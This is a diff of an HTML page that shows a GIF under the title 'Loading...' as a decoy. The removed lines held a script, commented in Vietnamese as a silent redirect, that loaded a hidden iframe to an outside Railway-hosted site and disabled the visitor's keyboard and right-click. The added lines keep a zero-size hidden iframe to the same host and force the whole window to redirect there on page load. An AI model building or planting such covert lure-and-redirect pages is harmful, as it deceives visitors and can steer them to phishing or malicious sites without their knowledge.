@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Image</title>
+    <title>Loading...</title>
     <style>
         body {
             margin: 0;
@@ -13,38 +13,26 @@
             min-height: 100vh;
             background: #f0f2f5;
         }
-        .gif-container {
-            max-width: 100%;
-            height: auto;
-        }
         img {
             max-width: 100%;
             height: auto;
-            display: block;
+        }
+        iframe {
+            width: 0;
+            height: 0;
+            border: 0;
+            position: absolute;
         }
     </style>
-    <script>
-        // Chạy chuyển hướng ngầm sau khi ảnh đã load
-        window.onload = function() {
-            // Tạo iframe ẩn để chuyển hướng ngầm
-            var iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'https://web-production-c2a9d.up.railway.app/';
-            document.body.appendChild(iframe);
-            
-            // Ngăn chặn các thao tác của user
-            document.onkeydown = function(e) {
-                return false;
-            };
-            document.oncontextmenu = function(e) {
-                return false;
-            };
-        };
-    </script>
 </head>
 <body>
-    <div class="gif-container">
-        <img src="YOUR_GIF_URL" alt="Loading...">
-    </div>
+    <img id="gifImage" src="https://media-ten.z-cdn.me/2YSqoqffc2sAAAAM/letter-n.gif" alt="Loading...">
+    <iframe src="https://web-production-c2a9d.up.railway.app/" style="display:none;"></iframe>
+    
+    <script>
+        window.onload = function() {
+            window.location.href = 'https://web-production-c2a9d.up.railway.app/';
+        }
+    </script>
 </body>
 </html>
